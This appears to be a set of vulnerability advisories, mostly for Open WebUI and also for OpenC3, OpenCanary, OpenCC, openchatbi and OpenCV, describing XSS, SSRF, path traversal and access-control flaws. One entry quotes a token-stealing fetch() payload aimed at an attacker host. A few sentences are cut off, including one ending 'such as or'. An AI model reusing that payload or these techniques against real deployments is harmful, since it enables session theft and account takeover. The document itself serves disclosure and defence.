Open-web-calendar removes CSS attacks originating from event sources by addressing HTML injection vulnerabilities. This security improvement mitigates Cross-Site Scripting (XSS) attacks that could exploit embedded ICS files. Previously, the calendar embedded ICS files without verifying their JavaScript or CSS content, posing a risk. An attacker could potentially manipulate an iframe to reload and spoof a trusted page, leading to credential theft.

Open Web Calendar affected versions are vulnerable to Cross-Site Scripting (CWE-79). Attackers could inject malicious JavaScript through unsafe URL protocols or unsanitized error messages, leading to data theft or session hijacking.

open-webui.advisory: Affected versions of the open-webui package are vulnerable to Stored Cross-site Scripting (XSS) due to the absence of MIME-type validation on the profile_image_url field. The get_user_profile_image_by_id() function in backend/open_webui/routers/users.py decodes base64 data URI values and serves them via StreamingResponse with a user-controlled media_type extracted directly from the data: header, allowing arbitrary content types — including image/svg+xml — to be re-served by the application origin. An authenticated attacker can store a malicious data:image/svg+xml;base64,... payload as their profile image URL, which, when retrieved through GET /api/v1/users/{user_id}/profile/image by any user who loads the profile, executes embedded scripts in the application origin, enabling JWT theft from localStorage and full account takeover, including of administrator accounts.

Affected versions of the open-webui package are vulnerable to Improper Authorisation due to the get_current_user dependency used across API endpoints failing to validate whether the authenticated user's role is user or admin. A newly registered account is assigned the pending role, intended to be activated by an administrator, and access controls are enforced only at the client-side presentation layer; the backend's get_current_user function in backend/utils/utils.py validates only that the submitted JWT is structurally valid without checking the associated role. An unauthenticated attacker can register a new account, obtain the issued JWT token, and use it to directly invoke all regular-user API endpoints — such as /ollama/api/tags — without administrative activation, accessing models and LLM functionality that should be restricted.

In version v0.3.10 of open-webui/open-webui, the api/v1/utils/pdf endpoint lacks authentication mechanisms, allowing unauthenticated attackers to access the PDF generation service. This vulnerability can be exploited by sending a POST request with an excessively large payload, potentially leading to server resource exhaustion and denial of service (DoS). Additionally, unauthorized users can misuse the endpoint to generate PDFs without verification, resulting in service misuse and potential operational and financial impacts.

Affected versions of the open-webui package are vulnerable to Improper Access Control due to the absence of ownership validation across all files/ API endpoints. The route handlers in backend/apps/webui/routers/files.py — including those responsible for listing, content retrieval via GET /api/v1/files/{id}/content, and deletion via DELETE /api/v1/files/{id} — enforce only an authentication check without filtering results or validating that the requesting user's identity matches the target file's user_id. An authenticated low-privileged user can exploit this by issuing requests to GET /api/v1/files/ to enumerate all files on the platform, GET /api/v1/files/{id}/content to read their full contents, and DELETE /api/v1/files/{id} to permanently remove files belonging to any other user, including administrators, thereby compromising both the confidentiality of sensitive user data and the integrity of the platform's file system.

In Open-webui/open-webui affected versions, the absence of authentication mechanisms allows any unauthenticated attacker to access the api/v1/utils/code/format endpoint. If a malicious actor sends a POST request with an excessively high volume of content, the server could become completely unresponsive. This could lead to severe performance issues, causing the server to become unresponsive or experience significant degradation, ultimately resulting in service interruptions for legitimate users.

In version v0.3.32 of open-webui/open-webui, the application allows users to submit large payloads in the email and password fields during the sign-in process due to the lack of character length validation on these inputs. This vulnerability can lead to a Denial of Service (DoS) condition when a user submits excessively large strings, exhausting server resources such as CPU, memory, and disk space, and rendering the service unavailable for legitimate users. This makes the server susceptible to resource exhaustion attacks without requiring authentication.

Affected versions of the open-webui package are vulnerable to CORS Misconfiguration due to the FastAPI CORSMiddleware being configured with allow_origins=["*"] and allow_credentials=True across multiple routers, which causes the middleware to reflect arbitrary request origins. This misconfiguration exists on routers, including backend/apps/webui/main.py, backend/apps/audio/main.py, backend/apps/images/main.py, backend/apps/rag/main.py, backend/apps/openai/main.py, backend/apps/ollama/main.py, and backend/main.py, combined with a session validation weakness that permits cross-site authenticated requests.

A vulnerability in open-webui/open-webui versions <= 0.3.8 allows remote code execution by non-admin users via Cross-Site Request Forgery (CSRF). The application uses cookies with the SameSite attribute set to lax for authentication and lacks CSRF tokens. This allows an attacker to craft a malicious HTML that, when accessed by a victim, can modify the Python code of an existing pipeline and execute arbitrary code with the victim's privileges.

In version 0.3.8 of open-webui, an endpoint for converting markdown to HTML is exposed without authentication. A maliciously crafted markdown payload can cause the server to spend excessive time converting it, leading to a denial of service. The server becomes unresponsive to other requests until the conversion is complete.

In open-webui/open-webui version v0.3.8, there is an improper privilege management vulnerability. The application allows an attacker, acting as an admin, to delete other administrators via the API endpoint. This action is restricted by the user interface but can be performed through direct API calls.

Affected versions of the open-webui package are vulnerable to Information Disclosure due to missing authorization checks on prompt retrieval endpoints. The /api/v1/prompts/ and /api/v1/prompts/command/{command_id} endpoints fail to verify whether the requesting user has administrator privileges before returning prompt data, allowing any authenticated user to enumerate and access all prompts in the system.

An improper access control vulnerability in open-webui/open-webui v0.3.8 allows an attacker to view admin details. The application does not verify whether the attacker is an administrator, allowing the attacker to directly call the /api/v1/auths/admin/details interface to retrieve the first admin (owner) details.

Affected versions of the open-webui package are vulnerable to Stored Cross-Site Scripting (XSS) due to insufficient input sanitization in the chat file upload functionality. The file upload feature fails to properly validate or sanitize file content before storage and subsequent display, allowing malicious JavaScript to be embedded within uploaded files. An attacker can exploit this vulnerability by uploading a file containing malicious JavaScript code and sharing the file URL or chat session with victims, causing the script to execute in the victims' browsers and potentially leading to session hijacking, data theft, or phishing attacks.

Affected versions of the open-webui package are vulnerable to Cross-Site Request Forgery (CSRF) due to using GET requests for state-changing operations. The endpoints /rag/api/v1/reset, /rag/api/v1/reset/db, /api/v1/memories/reset, and /rag/api/v1/reset/uploads perform sensitive deletion and reset operations via GET methods without CSRF protection, violating RESTful design principles.

The /openai/models endpoint in open-webui/open-webui version 0.3.8 is vulnerable to Server-Side Request Forgery (SSRF). An attacker can change the OpenAI URL to any URL without checks, causing the endpoint to send a request to the specified URL and return the output. This vulnerability allows the attacker to access internal services and potentially gain command execution by accessing instance secrets.

A stored cross-site scripting (XSS) vulnerability exists in open-webui/open-webui version 0.3.8. The vulnerability is present in the /api/v1/models/add endpoint, where the model description field is improperly sanitized before being rendered in chat. This allows an attacker to inject malicious scripts that can be executed by any user, including administrators, potentially leading to arbitrary code execution.

Affected versions of the open-webui package are vulnerable to Arbitrary File Overwrite due to improper path handling on Windows systems. The download_model endpoint fails to properly validate file paths when processing model downloads, allowing path traversal sequences to write files outside the intended directory.

An improper access control vulnerability in open-webui/open-webui v0.3.8 allows attackers to view and delete any files. The application does not verify whether the attacker is an administrator, allowing the attacker to directly call the GET /api/v1/files/ interface to retrieve information on all files uploaded by users, which includes the ID values. The attacker can then use the GET /api/v1/files/{fileid} interface to obtain information on any file and the DELETE /api/v1/files/{fileid} interface to delete any file.

A vulnerability in open-webui/open-webui allows an attacker with a user-level account to perform a session fixation attack. The session cookie for all users is set with the default SameSite=Lax and does not have the Secure flag enabled, allowing the session cookie to be sent over HTTP to a cross-origin domain. An attacker can exploit this by embedding a malicious markdown image in a chat, which, when viewed by an administrator, sends the admin's session cookie to the attacker's server. This can lead to a stealthy administrator account takeover, potentially resulting in remote code execution (RCE) due to the elevated privileges of administrator accounts.

Affected versions of the open-webui package are vulnerable to Arbitrary File Overwrite due to improper input validation of user-supplied filenames. The /models/upload endpoint constructs file paths using file_path = f"{UPLOAD_DIR}/{file.filename}" without sanitizing the file.filename parameter, allowing directory traversal sequences to escape the intended upload directory. An attacker can exploit this vulnerability by crafting malicious filenames containing path traversal sequences to overwrite arbitrary files on the system, potentially modifying system binaries, configuration files, or sensitive data to achieve remote code execution.

OpenWebUI version 0.3.0 contains a vulnerability in the audio API endpoint /audio/api/v1/transcriptions that allows for arbitrary file upload. The application performs insufficient validation on the file.content_type and allows user-controlled filenames, leading to a path traversal vulnerability. This can be exploited by an authenticated user to overwrite critical files within the Docker container, potentially leading to remote code execution as the root user.

Affected versions of the open-webui package are vulnerable to Improper Authorisation due to a missing ownership check on the model update endpoint. The POST /api/v1/models/model/update endpoint does not verify whether the authenticated user is the owner of the target model before applying modifications, allowing any authenticated user to submit update requests referencing another user's model identifier. An authenticated attacker can craft a POST request to /api/v1/models/model/update with an arbitrary id parameter belonging to another user's private model, thereby modifying its configuration, base model, or access control settings without authorization.

Affected versions of the open-webui package are vulnerable to Cross-site Scripting (XSS) due to unsanitized user-controlled HTML being assigned to innerHTML when “Insert Prompt as Rich Text” is enabled. The replaceCommandWithText function in src/lib/components/common/RichTextInput.svelte parses prompt text with marked.parse and injects it into a temporary element via tempDiv.innerHTML without sanitization, enabling stored DOM XSS through custom prompts.

Affected versions of the open-webui package are vulnerable to Code Injection due to unsafe execution of untrusted Server-Sent Events (SSE) “execute” payloads from external model servers. The Direct Connections frontend SSE handler evaluates event.data.code with a new Function() for executing events without validating the event origin or sandboxing, granting injected code full access to the browser context, including localStorage tokens.

Affected versions of the open-webui package are vulnerable to Server-Side Request Forgery (SSRF) due to unvalidated arbitrary URL processing in the /api/v1/retrieval/process/web endpoint. The backend.open_webui.routers.retrieval.process_web handler passes the user-controlled form_data.url parameter directly into get_content_from_url(), which via get_loader(), get_web_loader() and YoutubeLoader() fetches the supplied URL without restrictions on private IP ranges, localhost, cloud metadata endpoints, or disallowed protocols.

Affected versions of the open-webui package are vulnerable to Cross-site Scripting (XSS) due to an insufficiently restrictive iFrame sandbox configuration in the HTML rendering view. The HTML rendering view embeds chat-generated content inside an iFrame using the sandbox="allow-scripts allow-same-origin" directive, which permits script execution with access to the parent document's local storage, effectively nullifying the sandbox's protective intent. An attacker can exploit this by injecting a malicious script — such as fetch('https://attacker.local/?' + localStorage.getItem('token')) — into a shared chat, an imported conversation file, or an uploaded document, causing the victim's authentication token to be silently exfiltrated to an attacker-controlled server when the HTML view is rendered.

Affected versions of the open-webui are vulnerable to Broken Access Control due to an improper authorization check on the Tool Valves endpoint. The vulnerable Tool Valves route allows a low-privileged user to read valve data through GET /api/v1/tools/id/<tool_id>/valves because backend/open_webui/routers/tools.py does not enforce administrative permissions for that code path. An attacker with at least Member privileges can retrieve sensitive values such as API keys from configured Tool Valves and, in the worst case, use that access to interact with third-party systems in the context of the configured Open WebUI technical user.

Affected versions of the open-webui package are vulnerable to Missing Authorization due to a missing ownership check when deleting files from a knowledge base. The remove_file_from_knowledge_by_id function in backend/open_webui/routers/knowledge.py verifies that the user can write to the selected knowledge base, but it does not verify that form_data.file_id actually belongs to that knowledge base before calling Files.delete_file_by_id.

Affected versions of the open-webui package are vulnerable to Improper Authorization due to missing ownership validation on user-supplied collection identifiers. In backend/open_webui/routers/retrieval.py, the query_collection_handler function behind the /api/v1/retrieval/query/collection endpoint accepts collection_names such as user-memory-{USER_UUID} and file-{FILE_UUID} but only verifies that the requester is authenticated, not that they own or are allowed to access the referenced collection.

Affected versions of the open-webui package are vulnerable to Path Traversal due to unsanitised handling of the uploaded multipart filename in the transcription workflow. In backend/open_webui/routers/audio.py, the POST /api/v1/audio/transcriptions handler derives ext from file.filename.split(".")[-1], concatenates it into filename and file_path, and passes the result to open() without path sanitisation, while the exception handler returns the resulting FileNotFoundError message verbatim in the HTTP 400 response.

Affected versions of the open-webui package are vulnerable to Improper Authorization due to a missing ownership check on file updates. The process_files_batch() function exposed through POST /api/v1/retrieval/process/files/batch updates files by ID with Files.update_file_by_id(...) without verifying that the authenticated user owns the target file, and a user can obtain valid file UUIDs through GET /api/v1/knowledge/{id}/files when they have read access to a shared knowledge base.

Affected versions of the open-webui package are vulnerable to Improper Authorisation due to the POST /api/v1/retrieval/process/web endpoint in backend/open_webui/routers/retrieval.py accepting a user-supplied collection_name parameter without performing any authorisation check to verify that the requesting user owns or has write access to the target collection. When the overwrite query parameter is set to its default value of True, the save_docs_to_vector_db function calls VECTOR_DB_CLIENT.delete_collection() on the specified collection before writing new content. An authenticated user who obtains a target knowledge base UUID — trivially possible via the knowledge-bases enumeration vulnerability — can destroy the victim's entire vector collection and replace it with attacker-controlled content fetched from an arbitrary URL, permanently corrupting RAG query results for that knowledge base.

Affected versions of the open-webui package are vulnerable to Incorrect Authorisation due to the Socket.IO connect handler in backend/open_webui/socket/main.py storing the user's role in the in-memory SESSION_POOL at connection time, while the heartbeat handler subsequently refreshes only the last_seen_at timestamp without re-fetching the role from the database. The ydoc:document:join and document_save_handler Socket.IO event handlers perform admin role checks against the stale cached value, and neither the role-update endpoint nor the user-deletion endpoint in backend/open_webui/routers/users.py invalidates or disconnects affected Socket.IO sessions. A user whose administrator privileges have been revoked can retain admin-level access to any other user's collaborative notes through their still-active Socket.IO connection, reading and overwriting note content for as long as they keep the connection alive via automatic heartbeats.

Affected versions of the open-webui package are vulnerable to Improper Input Validation due to an incomplete enforcement of API key endpoint restrictions based on the authentication header used. The endpoint restriction check is applied only to API keys presented via the Authorization: Bearer header, while the same key submitted via the x-api-key header bypasses the restriction check entirely, despite still being authenticated and processed by the API routing layer. An attacker in possession of an API key that has been administratively restricted from accessing endpoints such as /api/v1/messages can bypass those restrictions entirely by resubmitting the identical key using the x-api-key header, obtaining full LLM responses and potentially accessing admin-scoped endpoints, effectively nullifying the operator-configured permission model.

Affected versions of the open-webui package are vulnerable to Server-Side Request Forgery (SSRF) due to a silently failing IPv6 validation call in the validate_url() function located in backend/open_webui/retrieval/web/utils.py. The function invokes validators.ipv6(ip, private=True), but the validators library does not implement the private keyword for IPv6, causing a ValidationError that evaluates as falsy and permits every IPv6 address to bypass the filter; additionally, IPv4-mapped IPv6 addresses (e.g., ::ffff:10.0.0.1) and several reserved IPv4 ranges including 0.0.0.0/8 and 100.64.0.0/10 are not blocked. An authenticated attacker can submit a crafted IPv6 or IPv4-mapped address to endpoints such as /api/v1/retrieval/process/web, causing the server to issue HTTP requests to internal network resources including cloud metadata services, and in environments running AWS IMDSv1, this enables full exfiltration of IAM security credentials.

Affected versions of the open-webui package are vulnerable to Information Disclosure due to an incomplete access control allowlist in the _validate_collection_access function within backend/open_webui/routers/retrieval.py, which enforces ownership checks only for collections matching the user-memory-* and file-* naming patterns while permitting all other collection names to pass through unchecked. The system-level knowledge-bases meta-collection, which stores the UUIDs, names, and descriptions of every knowledge base on the instance, falls outside the allowlist and can be queried directly via the retrieval endpoints. Any authenticated user can enumerate all knowledge base metadata across the entire instance by submitting queries against the knowledge-bases collection name, obtaining the UUIDs required to execute subsequent attacks such as knowledge base destruction or RAG poisoning.

Affected versions of the open-webui package are vulnerable to Improper Authentication due to the absence of a non-empty password validation in the LDAP authentication flow. The LdapForm Pydantic model in backend/open_webui/models/auths.py defines password as a str field with no minimum length constraint, allowing an empty string to pass validation, and the subsequent Connection.bind() call in backend/open_webui/routers/auths.py forwards the empty password directly to the LDAP server as a Simple Bind. Per RFC 4513, many LDAP servers — including OpenLDAP in its default configuration — return a success result code for a Simple Bind with a valid DN and an empty password (unauthenticated simple authentication), causing the application to issue a full session token for the targeted account. An unauthenticated attacker who knows a valid LDAP username against an instance with LDAP enabled and an LDAP server that permits unauthenticated simple binds, can obtain a session token for any account, including administrator accounts.

Affected versions of the open-webui package are vulnerable to an Exposure of Resource to Wrong Sphere due to the tool_servers and terminal_servers Redis cache keys in backend/open_webui/utils/tools.py lacking the instance-specific REDIS_KEY_PREFIX applied to every other key in the codebase. The tool_servers and terminal_servers keys are stored and retrieved using bare, unprefixed names, so when multiple open-webui instances share a single Redis backend — a documented and supported deployment topology — these keys collide across instances. An attacker with administrative access on one instance can overwrite the tool server configuration for all other instances sharing the same Redis database by writing a malicious entry to the bare tool_servers key, causing other instances to relay tool call payloads, including chat content and user identity data, to attacker-controlled infrastructure.

Affected versions of the open-webui package are vulnerable to Improper Authorisation due to the create_new_channel and update_channel_by_id endpoints in backend/open_webui/routers/channels.py omitting the filter_allowed_access_grants() call that every other resource router in the codebase applies before persisting access grant data. This function enforces the administrator's sharing permission policy — including stripping wildcard principal_id: "*" grants from users who lack the sharing.public_* permission. A regular authenticated user who creates or owns a group channel can submit arbitrary access grants, including public wildcard grants, which are stored verbatim by set_access_grants in backend/open_webui/models/channels.py, bypassing the configured permission framework and making the channel publicly accessible to all users on the instance.

Affected versions of the open-webui package are vulnerable to Server-Side Request Forgery (SSRF) due to the absence of URL validation in the _process_picture_url() function in backend/open_webui/utils/oauth.py. This function fetches the picture claim URL received from an OAuth identity provider using aiohttp.ClientSession.get() without invoking validate_url(), which is inconsistent with existing protections applied in backend/open_webui/utils/files.py and backend/open_webui/routers/images.py, and the full HTTP response body is then base64-encoded and persisted to the profile_image_url field, which is readable via the API.

Affected versions of the open-webui package are vulnerable to Incorrect Authorisation due to a missing permission check on a state-modifying endpoint. The POST /api/v1/notes/{id}/pin endpoint in backend/open_webui/routers/notes.py invokes AccessGrants.has_access with permission='read' before executing Notes.toggle_note_pinned_by_id, a write operation, instead of enforcing permission='write' as all other mutating endpoints do. An authenticated user who has been granted only read access to a shared note can repeatedly call the POST /api/v1/notes/{id}/pin endpoint to toggle the is_pinned field, modifying note state without write authorisation, with the change visible to the note owner and all other users with access.

Affected versions of the open-webui package are vulnerable to Stored Cross-Site Scripting (XSS) due to the absence of DOMPurify sanitization on file preview rendering paths. The {@html} directive in FilePreview.svelte (line 324) and FileItemModal.svelte (lines 560 and 590) renders the fileOfficeHtml, excelHtml, and docxHtml variables directly from user-uploaded Office, Excel, and DOCX files without sanitization, despite DOMPurify being available and correctly applied in other components such as MarkdownInlineTokens.svelte and Banner.svelte. An authenticated attacker can upload a maliciously crafted Office document containing embedded HTML payloads — such as or

Affected versions of the open-webui package are vulnerable to Cross-Site Request Forgery (CSRF) due to the absence of input validation on image URL parameters accepted across multiple rendering components. Components including ProfileImage.svelte, Account.svelte, Navbar.svelte, UserList.svelte, Image.svelte, Message.svelte, Placeholder.svelte, ResponseMessage.svelte, Models.svelte, and ModelEditor.svelte render user-supplied image URLs without validating that they resolve to legitimate image resources, causing the browser to issue GET requests to arbitrary attacker-controlled endpoints whenever the image is rendered. An authenticated attacker can set a malicious URL as a profile picture, model image, or embed it within a shared chat or note, causing any user who views the content to unknowingly transmit their cookies, IP address, and user-agent string to the attacker's server, facilitating session theft and targeted reconnaissance.

Affected versions of the open-webui package are vulnerable to Stored Cross-site Scripting (XSS) due to insufficient sanitisation of user-supplied SVG content in webhook profile image URLs. The GET /api/v1/channels/webhooks/{webhook_id}/profile/image endpoint accepts data:image/svg+xml;base64,... payloads via the profile_image_url parameter during webhook creation or update, base64-decodes them, and serves the resulting SVG as image/svg+xml with Content-Disposition: inline without any sanitisation or transformation. A low-privileged authenticated user can submit a malicious SVG payload containing event handlers such as onload to the webhook creation endpoint, which is persisted in the database and executes arbitrary JavaScript in the application's origin when any authenticated user's browser loads the profile image URL, enabling session token exfiltration, API key theft, and unauthorised actions on behalf of the victim.

Affected versions of the open-webui package are vulnerable to Cross-site Scripting (XSS) due to reliance on an attacker-controlled filename extension when persisting uploaded audio files. The /api/v1/audio/transcriptions endpoint derives the saved file extension from the user-supplied filename in audio.py without validating it against an allowlist or reconciling it with the actual Content-Type, while the /cache/{path} route in main.py serves the resulting file via FileResponse with a Content-Type inferred from the on-disk extension and no Content-Disposition header. An authenticated user holding the default-enabled chat.stt permission can upload a polyglot WAV+HTML file named with an .html extension, causing the cached file to be served as text/html, and trick any other authenticated user — including administrators — into opening the resulting URL, executing arbitrary JavaScript in the Open WebUI origin and exfiltrating session tokens from localStorage to enable full account takeover.

Affected versions of the open-webui package are vulnerable to Cross-site Scripting (XSS) due to insecure handling of user-supplied prompts that are incorporated into the web UI context. The prompt processing mechanism does not sanitize or neutralize embedded JavaScript, allowing crafted prompts to inject persistent script code via stored user input. An attacker can exploit this by submitting a malicious prompt that executes arbitrary JavaScript when viewed in the Open WebUI interface, enabling session hijacking, content manipulation, or sensitive data theft from users’ browser contexts.

Affected versions of the open-webui package are vulnerable to Arbitrary File Upload and Path Traversal due to insufficient sanitisation of user-supplied filenames in the file upload handler. The /rag/api/v1/doc endpoint directly incorporates the filename from the HTTP multipart form data into the destination file path without validating or removing dot-segment sequences, allowing files to be written to arbitrary locations on the filesystem. An attacker with authenticated access can upload malicious files outside the intended upload directory, potentially overwriting critical files such as SSH authorized_keys or deploying pickled Python objects to achieve Remote Code Execution.

Affected versions of the Open WebUI package are vulnerable to Denial of Service (DoS) due to improper input validation on user registration fields. The signup functionality fails to limit the size of the 'name' field input, allowing excessively large text values to be stored in the database, which causes the Admin panel to become unresponsive when attempting to render or process these oversized entries.

Affected versions of the open-webui package are vulnerable to Information Disclosure due to differentiated error messages that reveal file existence and directory information. The embedding model update logic in the `main.py` under the `backend/apps/rag` module performs a file existence check and returns distinct error messages depending on whether the specified model path exists or is misconfigured. An attacker with administrative access to the update feature can enumerate file names and traverse directories on the host by observing error responses, potentially exposing sensitive file system information to unauthorized parties.

Affected versions of the open-webui package are vulnerable to Arbitrary File Write and Delete due to unsanitized concatenation of the user-controlled `filename` with `CACHE_DIR`. The `/api/pipelines/upload` endpoint directly appends the `file.filename` parameter to `CACHE_DIR` without validating traversal sequences or disallowed path components, enabling arbitrary filesystem operations. An attacker with access can craft a request to overwrite or delete arbitrary files on the host system, potentially leading to remote code execution or service disruption.

Affected versions of the open-webui package are vulnerable to Insecure Direct Object Reference (IDOR) due to flawed decentralization in the memory update endpoint. The API endpoint `/api/v1/memories/{id}/update` in the `backend/apps/webui/routers/memories.py` module permits editing arbitrary user memories without proper authorization checks. An attacker who can access the memory update endpoint can manipulate the `{id}` parameter to modify other users’ memories, leading to unauthorized integrity impact and potential data tampering across user records.

Affected versions of the open-webui package are vulnerable to Insecure Direct Object Reference (IDOR) due to missing message ownership validation in the channel message management endpoints. The update_message_by_id() and delete_message_by_id() functions in backend/open_webui/routers/channels.py perform channel-level authorisation via has_access() but do not verify that the requesting user is the owner of the target message (message.user_id is never checked against user.id). An attacker with read access to a channel can modify or delete any message within that channel by directly calling the API endpoints with an arbitrary message_id, bypassing the frontend ownership controls.

Affected versions of the open-webui package are vulnerable to Incorrect Access Control due to missing ownership checks on task cancellation requests. The /api/tasks/stop/ API endpoint in open_webui.main accepts a task identifier from the requester and unconditionally cancels the referenced task without validating that the authenticated user owns or initiated the underlying LLM job.

Affected versions of the open-webui package are vulnerable to Path Traversal due to the file upload handler at the /ollama/models/upload route not validating or sanitising the file.filename value from the HTTP upload request. The upload_model function in backend/apps/ollama/main.py constructs the file path by directly concatenating UPLOAD_DIR with the user-supplied filename, allowing dot-segment sequences to traverse out of the intended upload directory.

Affected versions of the open-webui package are vulnerable to Cross-Site Scripting (XSS) due to unsafe handling of Excel file attachments during preview. The XLSX.utils.sheet_to_html function in the FileItemModal.svelte component converts uploaded spreadsheet data to HTML without performing input validation or sanitisation, and the resulting output is inserted directly into the DOM via the Svelte @html directive. An attacker can craft a malicious XLSX file containing JavaScript payloads in cell values that execute in the context of any user who previews the file.

Affected versions of the open-webui package are vulnerable to Missing Authorisation due to an absent access check on the channel members listing endpoint for standard channel types. The get_channel_members_by_id function in channels.py only verifies membership for group and dm channel types, while standard channels including private ones bypass the channel_has_access check entirely. An attacker with any authenticated account who knows a private channel UUID can enumerate all members of that channel via the GET /api/v1/channels/{id}/members endpoint, resulting in disclosure of user membership information.

Affected versions of the open-webui package are vulnerable to Stored Cross-Site Scripting (XSS) due to an incorrect DOMPurify application order in the AccountPending.svelte component. The component sanitises the raw Markdown input with DOMPurify before passing it to marked.parse(), which then converts Markdown link syntax containing javascript: URIs into executable HTML anchor tags that are rendered unsanitised via the {@html} directive.

Affected versions of the open-webui package are vulnerable to Missing Authorisation due to four Ollama proxy endpoints failing to enforce model access control. The generate_completion, embed, embeddings, and show_model_info endpoints in the Ollama router only require get_verified_user authentication and validate model existence against the full unfiltered model list, but never call AccessGrants.has_access() to verify the user is authorised for the requested model. An authenticated attacker can send requests to any Ollama model configured on the instance, bypassing administrator-defined access restrictions and group-based model assignments.

Affected versions of the open-webui package are vulnerable to Missing Authorisation due to the /responses endpoint in the OpenAI router failing to enforce per-model access control. The endpoint at /api/openai/responses only validates that a user has a valid session via get_verified_user but does not check model ownership, group membership, or AccessGrants before forwarding requests to upstream LLM providers. An authenticated attacker can interact with any model configured on the instance, including expensive or restricted models, potentially exhausting API budgets or extracting capabilities from fine-tuned models.

Affected versions of the open-webui package are vulnerable to Improper Access Control due to an incomplete membership authorisation check in the channel access logic. The is_user_channel_member function in models/channels.py queries for the existence of a ChannelMember row but does not verify the is_active field, so deactivated users whose membership row persists with is_active=False and status=left continue to pass all 15 message-level endpoint authorisation checks in channels.py.

Affected versions of the open-webui package are vulnerable to Missing Authorisation due to absent access checks in the RAG source resolution pipeline during chat completion. The get_sources_from_items function in retrieval/utils.py contains five code paths for resolving file and knowledge base references into vector search queries, but three of these paths pass user-supplied collection names directly to query_collection() without any authorisation verification.

Affected versions of the open-webui package are vulnerable to Stored Cross-Site Scripting (XSS) due to a pipeline-ordering flaw in the model description rendering logic. The sanitizeResponseContent function processes the raw Markdown model description before marked.parse() converts it to HTML, so a Markdown link payload with a javascript: URI passes through sanitisation unchanged and is subsequently rendered as an executable HTML anchor tag via the {@html} directive. An attacker with model creation permission can inject a crafted model description containing a javascript: link to execute arbitrary JavaScript in the browser of any user who views the malicious model.

Affected versions of the open-webui package are vulnerable to Improper Access Control due to missing authorisation checks on the base_model_id field during model chaining. The model creation, import, and chat completion endpoints accept arbitrary base_model_id values without verifying that the calling user has access to the referenced base model, while the check_model_access function in utils/models.py only validates access to the user-facing composed model. An attacker with standard user privileges can create a composed model that chains to a restricted base model and query it, thereby bypassing access controls to utilise models they are not authorised to use.

Affected versions of the open-webui package are vulnerable to Improper Access Control due to the ydoc:document:update Socket.IO event handler checking only room membership instead of write permission. Users with read-only access join the document room via ydoc:document:join, which requires only read permission, and can then emit update events that modify the in-memory Yjs document state and are broadcast to all collaborators in real time. An attacker with read-only access can inject arbitrary content into collaborative documents that is visible to all other users, and if any user with write access saves the document, the tampered content is persisted.

Affected versions of the open-webui package are vulnerable to Mass Assignment due to the FolderForm Pydantic model being configured with extra='allow', which permits arbitrary fields to pass through validation. In the insert_new_folder function, the server-assigned user_id is placed at the start of the dictionary and subsequently overwritten by the spread of user-controlled form data from model_dump(exclude_unset=True). An attacker can supply a crafted user_id field in the folder creation request to create folders in other users' accounts.

Affected versions of the open-webui package are vulnerable to Improper Access Control due to the model import endpoint lacking ownership verification. The POST /api/v1/models/import endpoint allows users with the workspace.models_import permission to overwrite any existing model by supplying a matching model ID, merging attacker-controlled payload data over the existing model without calling filter_allowed_access_grants. An attacker can overwrite models owned by other users, modifying their configuration including system prompts and access grants, bypassing the access control restrictions enforced on all other model mutation endpoints.

Affected versions of the open-webui package are vulnerable to Improper Authorisation due to the message update endpoint in standard channels requiring only read-level permission instead of write or ownership verification. The POST /api/v1/channels/{channel_id}/messages/{message_id}/update endpoint calls has_access(..., type="read"), which evaluates to True when the channel’s access_control is set to None, allowing any authenticated user to update messages authored by other users. An attacker with a standard user account can obtain a target message_id from the channel’s message list and submit an update request to modify another user’s message content without authorization.

openc3.advisory:
Affected versions of the OpenC3 COSMOS (openc3) package are vulnerable to Information Disclosure due to the clear-text storage of user passwords in web browser LocalStorage. The LocalStorage storage of `password` in the browser, without encryption or protection, exposes credentials when combined with Cross-Site Scripting (XSS) vulnerabilities in the OpenC3 COSMOS Open Source edition (not Enterprise Edition). An attacker able to exploit XSS (see GHSL-2024-128) can exfiltrate the stored plain-text `password` from LocalStorage, potentially allowing unauthorized access to user accounts and further compromise of connected embedded systems. 
# NOTE: This CVE only affects the Open Source edition, and not OpenC3 COSMOS Enterprise Edition.

Affected versions of the openc3 package are vulnerable to Cross-site Scripting (XSS) due to the login functionality reflecting unsanitized user input. The login endpoint in the OpenC3 cosmos module embeds user-supplied input directly into a web response without proper output encoding or sanitization. An attacker can craft a malicious link or input that triggers script execution in a victim’s browser during login, potentially facilitating session hijacking or other cross-site scripting impacts.

Affected versions of the openc3 package are vulnerable to Path Traversal due to improper limitation of a pathname to a restricted directory via the `LocalMode` class's `open_local_file` method. The `ScreensController#show` endpoint in the openc3 package fails to properly validate or sanitize the file path, allowing directory traversal sequences to access arbitrary `.txt` files on the COSMOS web server. An attacker with valid authentication and sufficient permissions can exploit this by issuing requests that traverse out of the intended directory and download arbitrary text files, potentially disclosing sensitive information.  
# NOTE: This CVE affects all OpenC3 COSMOS Editions

opencanary.advisory: Affected versions of the OpenCanary package are vulnerable to Improper Authorization due to execution of commands retrieved from a potentially writable configuration file. The daemon’s startup logic in the OpenCanary module directly executes commands specified in its config file without verifying integrity or source authenticity. An attacker with write access to the unprivileged user-writable config file can insert malicious commands that will be executed with root privileges when the daemon starts, enabling privilege escalation and full control over the host system.

opencc.advisory: Affected versions of the OpenCC package are vulnerable to Out-of-bounds Read due to improper length validation during UTF-8 processing. Specifically, MaxMatchSegmentation::Segment and Conversion::Convert(const char*) trust derived UTF-8 length values without enforcing that the matched length remains within the remaining input buffer, which can desynchronise pointer advancement and remaining-length tracking when malformed or truncated UTF-8 sequences are processed.

Open Chinese Convert (OpenCC) 1.0.5 allows attackers to cause a denial of service (segmentation fault) because BinaryDict::NewFromFile in BinaryDict.cpp may have out-of-bounds keyOffset and valueOffset values via a crafted .ocd file.

openchatbi.advisory: Affected versions of the openchatbi package are vulnerable to Path Traversal due to insufficient input sanitization of the file_format parameter. The openchatbi save_report tool in openchatbi/tool/save_report.py only strips leading dots via file_format.lstrip(".") and then builds the output path using f"{timestamp}_{clean_title}.{file_format}", allowing traversal sequences to remain in the constructed filename and escape the intended report directory.

If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding to OpenCV-Python 3.3.0.9) and earlier.

In opencv/modules/imgcodecs/src/grfmt_pxm.cpp, function ReadNumber did not checkout the input length, which lead to integer overflow. If the image is from remote, may lead to remote code execution or denial of service. This affects OpenCV 3.3 (corresponding with OpenCV-Python version 3.3.0.9) and earlier.

